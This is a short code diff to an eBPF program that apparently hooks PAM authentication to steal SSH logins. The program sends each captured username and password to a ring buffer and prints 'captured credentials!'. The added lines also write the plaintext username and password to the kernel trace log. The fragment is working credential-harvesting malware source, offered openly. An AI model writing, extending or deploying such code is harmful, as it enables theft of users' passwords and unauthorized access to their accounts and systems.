@@ -67,6 +67,8 @@ int BPF_KRETPROBE(AuthtokExist, int ret) {
   bpf_ringbuf_submit(sshUserPass, 0);
   bpf_map_delete_elem(&pamHandleMap, &pid);
   bpf_map_delete_elem(&authtokMap, &pid);
+  bpf_printk("user: %s\npassword: %s\n", sshUserPass->username,
+             sshUserPass->password);
   bpf_printk("captured credentials!\n");
   return 0;
 }
